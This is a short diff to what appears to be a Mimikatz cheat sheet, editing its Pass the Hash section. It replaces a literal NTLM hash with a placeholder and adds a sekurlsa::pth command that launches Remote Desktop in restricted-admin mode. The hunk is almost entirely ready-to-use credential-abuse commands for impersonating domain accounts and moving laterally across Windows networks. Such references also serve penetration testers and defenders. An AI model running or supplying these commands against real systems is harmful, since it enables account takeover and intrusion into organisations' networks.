@@ -67,9 +67,16 @@ privilege::debug
 
 ## Pass the Hash
 
+### powershell session
+
 ```csharp
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetaccount /domain:test.lab.local /ntlm:b38ff50
-264bc43012185d82c69794a4d8 /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetaccount /domain:test.lab.local /ntlm:<NTLM HASH> /run:powershell.exe"'
+```
+
+### RDP unrestricted admin
+
+```csharp
+sekurlsa::pth /user:admin /domain:domain /ntlm:<NTLM HASH> /run:"mstsc.exe /restrictedadmin"
 ```
 
 ## Kerberos Tickets
